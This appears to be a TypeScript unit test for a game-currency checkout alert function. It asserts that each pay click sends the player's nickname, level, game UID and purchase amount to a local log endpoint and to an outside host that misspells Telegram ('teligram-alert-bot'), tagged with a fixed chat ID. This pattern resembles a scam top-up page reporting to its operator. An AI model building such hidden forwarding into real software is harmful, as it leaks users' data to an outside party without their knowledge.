import { test } from 'node:test';
import assert from 'node:assert/strict';
import { notifyCheckoutClick } from '../src/lib/checkoutAlerts';
test('Pay-click alerts preserve both original destinations and payloads before payment', async () => {
  const calls: any[] = [];
  const transport: typeof fetch = async (url, options) => {
    calls.push({url, options, body: JSON.parse(String(options?.body))}); return new Response('{}');
  };
  notifyCheckoutClick({nickname:'Synthetic Player',level:55},'123456789',2180,550,transport);
  assert.equal(calls.length,2);
  assert.equal(calls[0].url,'/api/log-purchase');
  assert.deepEqual(calls[0].body,{nickname:'Synthetic Player',level:55,uid:'123456789',totalDiamonds:2180,price:550});
  assert.equal(calls[1].url,'https://teligram-alert-bot.vercel.app/api/send');
  assert.equal(calls[1].body.chat_id,'8422419131');
  assert.match(calls[1].body.message,/User Clicked PAY NOW/);
  assert.match(calls[1].body.message,/Level:\* 55/);
  assert.ok(!JSON.stringify(calls).includes('PAYMENT SUCCESS'));
});
